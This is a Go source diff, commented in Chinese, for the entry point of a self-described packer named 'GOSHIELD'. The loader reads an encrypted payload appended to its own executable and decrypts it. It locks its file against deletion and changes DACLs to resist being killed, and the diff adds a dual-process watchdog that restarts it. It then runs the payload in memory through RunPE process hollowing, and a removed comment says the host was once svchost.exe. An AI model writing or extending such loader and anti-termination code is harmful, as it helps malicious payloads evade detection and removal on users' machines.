@@ -12,7 +12,7 @@ import (
 )
 
 func main() {
-	// 1. 先从自身读取附加数据 (为了避免与后续的独占防删锁冲突，先读取数据到内存)
+	// 1. 先从自身读取附加数据
 	exePath, err := os.Executable()
 	if err != nil {
 		os.Exit(1)
@@ -30,58 +30,56 @@ func main() {
 	}
 	fileSize := stat.Size()
 
-	// 尾部结构大小: Key(32) + PayloadSize(8) + Magic(8) = 48 字节
 	footerSize := int64(48)
 	if fileSize < footerSize {
 		file.Close()
-		os.Exit(1) // 无附加数据
+		os.Exit(1)
 	}
 
-	// 定位并读取尾部 48 字节
 	file.Seek(-footerSize, io.SeekEnd)
 	footer := make([]byte, footerSize)
 	io.ReadFull(file, footer)
 
-	// 校验特征码
 	if string(footer[40:48]) != "GOSHIELD" {
 		file.Close()
-		os.Exit(1) // 非法篡改或未加壳
+		os.Exit(1)
 	}
 
-	// 解析 Payload 大小和密钥
 	key := footer[0:32]
 	payloadSize := binary.LittleEndian.Uint64(footer[32:40])
 
 	if fileSize < footerSize+int64(payloadSize) {
 		file.Close()
-		os.Exit(1) // 文件损坏
+		os.Exit(1)
 	}
 
-	// 定位并读取密文 Payload
 	file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
 	encryptedPayload := make([]byte, payloadSize)
 	io.ReadFull(file, encryptedPayload)
 	
-	// 读取完毕，立刻关闭文件句柄，释放系统默认锁
 	file.Close()
 
-	// 2. 启动最强防御：独占锁定自身防删 (ShareMode=0)，修改 DACL 防杀
+	// 2. 启动单机防御：独占锁定防删、DACL 防杀护甲
 	protect.EnableProtection()
 
-	// 3. 解密真实程序的 Payload
+	// 3. 🌟 启动双进程不死守护 (注意：这必须放在确认文件未被篡改之后执行，防止坏文件死循环)
+	// 如果当前是影子进程，它会在 StartWatchdog 内部阻塞并自动退出，不会继续执行后面的 RunPE 逻辑
+	protect.StartWatchdog()
+
+	// 4. 解密真实程序的 Payload
 	decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
 	if err != nil {
-		os.Exit(1) // 密文损坏或被篡改，防分析
+		protect.NotifyNormalExit() // 哪怕出错也要和平解除影子，避免死循环复活
+		os.Exit(1) 
 	}
 
-	// 4. 执行内存加载 (RunPE)
-	// 🌟 核心修改点：将傀儡宿主从 svchost.exe 替换为 exePath (自身路径)
-	// 这样不仅能完美读取同目录下的配置文件，还能让任务管理器里显示的名字也是您原本的程序名！
+	// 5. 执行内存加载 (RunPE)
 	err = loader.Execute(exePath, decryptedPayload)
 	if err != nil {
+		protect.NotifyNormalExit()
 		os.Exit(1)
 	}
 
-	// 5. 真实程序已退出，外壳自动顺延执行到末尾并退出
-	// 进程退出后，Windows 会自动回收防删持有的 FileHandle 并销毁 DACL 防护对象
+	// 6. 真实程序已退出，触发安全信号通知影子进程一起和平关闭！
+	protect.NotifyNormalExit()
 }
